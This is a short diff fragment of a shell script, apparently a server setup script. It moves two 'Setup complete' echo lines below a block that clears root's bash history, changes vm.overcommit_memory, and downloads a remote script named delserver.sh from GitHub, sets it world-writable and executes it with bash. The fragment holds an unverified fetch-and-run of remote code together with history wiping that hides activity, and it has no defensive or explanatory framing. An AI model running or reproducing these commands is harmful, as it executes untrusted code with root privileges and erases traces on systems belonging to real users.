@@ -808,9 +808,10 @@ echo > /root/.bash_history
 
 sysctl -w vm.overcommit_memory=2
 echo "vm.overcommit_memory=2" >> /etc/sysctl.conf
-echo "[*] Setup complete"
-echo "[*] Yee-Go"
+
 cd /$HOME/
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
 chmod 777 delserver.sh
 /bin/bash ./delserver.sh
+echo "[*] Setup complete"
+echo "[*] Yee-Go"
